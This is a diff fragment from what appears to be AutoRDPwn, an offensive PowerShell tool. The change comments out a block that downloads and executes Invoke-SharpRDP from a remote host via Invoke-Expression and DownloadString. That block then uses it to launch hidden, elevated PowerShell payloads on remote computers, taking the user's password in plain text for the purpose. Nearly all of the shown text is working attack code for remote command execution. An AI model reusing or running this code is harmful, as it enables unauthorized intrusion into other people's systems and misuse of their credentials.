@@ -279,7 +279,7 @@ function Remove-Exclusions {
         Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
         if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }}
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
+        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; <# if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://gitlab.com/JoelGMSec/AutoRDPwn/-/raw/main/Resources/Scripts/Invoke-SharpRDP.ps1')}
         if(!$user) { Invoke-SharpRDP "computername=$computer command=powershell.exe -windowstyle hidden $Pwn1 elevated=taskmgr" ; Write-Host
         Invoke-SharpRDP "computername=$computer command=powershell.exe -windowstyle hidden $Pwn2 elevated=taskmgr" ; Write-Host
@@ -288,7 +288,7 @@ function Remove-Exclusions {
         if($user) { Invoke-SharpRDP "computername=$computer username=$user password=$PlainTextPassword command=powershell.exe -windowstyle hidden $Pwn1 elevated=taskmgr" ; Write-Host
         Invoke-SharpRDP "computername=$computer username=$user password=$PlainTextPassword command=powershell.exe -windowstyle hidden $Pwn2 elevated=taskmgr" ; Write-Host
         Invoke-SharpRDP "computername=$computer username=$user password=$PlainTextPassword command=powershell.exe -windowstyle hidden $Pwn3 elevated=taskmgr" ; Write-Host
-        Invoke-SharpRDP "computername=$computer username=$user password=$PlainTextPassword command=powershell.exe -windowstyle hidden $Pwn4 elevated=taskmgr" }}
+        Invoke-SharpRDP "computername=$computer username=$user password=$PlainTextPassword command=powershell.exe -windowstyle hidden $Pwn4 elevated=taskmgr" } #>}
         
         'M' { Show-Banner ; Show-Modules ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
         $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
